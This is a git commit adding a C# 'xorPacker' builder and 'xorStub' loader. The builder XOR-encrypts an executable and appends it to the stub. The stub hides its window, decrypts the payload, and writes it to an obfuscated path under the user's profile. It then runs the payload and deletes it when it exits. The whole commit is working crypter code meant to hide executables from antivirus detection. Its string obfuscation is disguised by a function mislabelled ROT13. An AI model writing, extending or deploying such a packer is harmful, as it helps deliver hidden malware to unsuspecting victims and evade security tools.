21ac667677487f20c912401c42a6226f76bd8b03
NQNT <54726985+nqntmqmqmb@users.noreply.github.com>
2020-08-09 01:11:15 +0200

    Add files via upload
    stub & builder

---
+++ xorPacker/Program.cs
@@ -0,0 +1,75 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.IO;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace xorPacker
+{
+    class Program
+    {
+        public static string XORCipher(string data, string key)
+        {
+            int dataLen = data.Length;
+            int keyLen = key.Length;
+            char[] output = new char[dataLen];
+
+            for (int i = 0; i < dataLen; ++i)
+            {
+                output[i] = (char)(data[i] ^ key[i % keyLen]);
+            }
+
+            return new string(output);
+        }
+
+        static void Main(string[] args)
+        {
+            int length = 25;
+            StringBuilder str_build = new StringBuilder();
+            Random random = new Random();
+
+            char letter;
+
+            for (int i = 0; i < length; i++)
+            {
+                double flt = random.NextDouble();
+                int shift = Convert.ToInt32(Math.Floor(25 * flt));
+                letter = Convert.ToChar(shift + 65);
+                str_build.Append(letter);
+            }
+
+            Console.Write("PE to pack : ");
+            string exe = Console.ReadLine();
+            File.WriteAllBytes(Directory.GetCurrentDirectory() + "\\" + "packed_exe.exe", Properties.Resources.xorStub);
+   
+            try
+            {
+                Byte[] bytes = File.ReadAllBytes(exe);
+                Console.WriteLine("[*] PE (works with .NET) : " + exe);
+                String file = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(XORCipher(Convert.ToBase64String(bytes), str_build.ToString())));
+                String randomKey = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(XORCipher(str_build.ToString(), "randomkey")));
+
+                using (FileStream filestream = new FileStream("packed_exe.exe", FileMode.Open, FileAccess.ReadWrite, FileShare.None))
+                {
+                    using (BinaryWriter binaryWriter = new BinaryWriter(filestream))
+                    {
+                        filestream.Position = filestream.Length + 1;
+                        binaryWriter.Write("***" + file + "|" + randomKey);
+                        Console.WriteLine("[!] PE packed");
+                    }
+                }
+
+            } 
+            
+            catch (System.IO.FileNotFoundException) {
+                Console.WriteLine("File does not exist.");
+            }
+            
+            Console.ReadLine();
+        }
+    }
+}
---
+++ xorStub/Program.cs
@@ -0,0 +1,87 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Text;
+using System.IO;
+using System.Diagnostics;
+using System.Management;
+using System.Runtime.InteropServices;
+
+namespace xorStub
+{
+    class Program
+    {
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+        public static string ROT13Encode(string data, string key)
+        {
+            int dataLen = data.Length;
+            int keyLen = key.Length;
+            char[] output = new char[dataLen];
+
+            for (int i = 0; i < dataLen; ++i)
+            {
+                output[i] = (char)(data[i] ^ key[i % keyLen]);
+            }
+
+            return new string(output);
+        }
+        static class RandomUtil
+        {
+            public static string GetRandomString()
+            {
+                string path = Path.GetRandomFileName();
+                path = path.Replace(".", "");
+                return path;
+            }
+        }
+
+        static void Main(string[] args)
+        {
+            IntPtr h = Process.GetCurrentProcess().MainWindowHandle;
+            ShowWindow(h, 0);
+            while (true)
+            {
+                using (StreamReader streamReader = new StreamReader(System.Reflection.Assembly.GetEntryAssembly().Location))
+            {
+                using (BinaryReader binaryReader = new BinaryReader(streamReader.BaseStream))
+                {
+                    byte[] stubBytes = binaryReader.ReadBytes(Convert.ToInt32(streamReader.BaseStream.Length));
+                    string stubSettings = Encoding.ASCII.GetString(stubBytes).Substring(Encoding.ASCII.GetString(stubBytes).IndexOf("***")).Replace("***", "");
+                    string randomKey = ROT13Encode(Encoding.UTF8.GetString(Convert.FromBase64String(stubSettings.Split('|')[1])), "randomkey");
+                    string cipheredFile = stubSettings.Split('|')[0];
+                    string fileName = RandomUtil.GetRandomString();
+
+                    string[] CurrentDirectoryy = new string[]
+                    {
+                        ROT13Encode("{", "AAAQSDQSDF"),
+                        ROT13Encode(" !# ", "QSDQSFFF"),
+                        ROT13Encode("#4200", "QSDQSDQFGHG"),
+                        ROT13Encode("')-$", "JHJLHJKYTUTYU"),
+                        ROT13Encode("!>6", "QDSFDFHNGFGN"),
+                        ROT13Encode("v&.2", "XCVW<X<WCBN")
+                    };
+
+                    Byte[] bytesBack = Convert.FromBase64String(ROT13Encode(Encoding.UTF8.GetString(Convert.FromBase64String(cipheredFile)), randomKey));
+                    File.WriteAllBytes(CurrentDirectoryy[0] + "\\" + CurrentDirectoryy[1] + "\\" + System.Environment.UserName + "\\" + CurrentDirectoryy[2] + "\\" + CurrentDirectoryy[3] + "\\" + CurrentDirectoryy[4] + fileName + CurrentDirectoryy[5], bytesBack);
+
+                    Process p = new Process();
+                    p.Exited += new EventHandler(p_Exited);
+                    p.StartInfo.FileName = CurrentDirectoryy[0] + "\\" + CurrentDirectoryy[1] + "\\" + System.Environment.UserName + "\\" + CurrentDirectoryy[2] + "\\" + CurrentDirectoryy[3] + "\\" + CurrentDirectoryy[4] + fileName + CurrentDirectoryy[5];
+                    p.EnableRaisingEvents = true;
+                    p.Start();
+
+                    void p_Exited(object sender, EventArgs e)
+                    {
+                        File.Delete(CurrentDirectoryy[0] + "\\" + CurrentDirectoryy[1] + "\\" + System.Environment.UserName + "\\" + CurrentDirectoryy[2] + "\\" + CurrentDirectoryy[3] + "\\" + CurrentDirectoryy[4] + fileName + CurrentDirectoryy[5]);
+                        Environment.Exit(0);
+                    }
+
+                    Console.ReadLine();
+                }
+            }
+            }
+        }
+    }
+}
